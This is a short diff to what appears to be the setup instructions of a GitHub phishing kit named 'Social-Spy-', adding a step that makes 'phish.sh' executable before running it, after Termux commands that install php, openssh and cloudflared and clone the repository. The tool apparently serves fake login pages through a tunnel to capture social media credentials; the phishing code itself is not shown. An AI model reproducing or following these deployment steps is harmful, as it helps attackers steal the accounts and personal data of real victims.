@@ -58,5 +58,8 @@ pkg install php openssh cloudflared git -y
 git clone https://github.com/ayushsardar831-cmd/Social-Spy-.git
 cd Social-Spy-
 
+𝙂𝙞𝙫𝙚 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣
+chmod +x phish.sh
+
 🏃🏻‍➡️𝙍𝙪𝙣 𝙏𝙤𝙤𝙡
 bash phish.sh
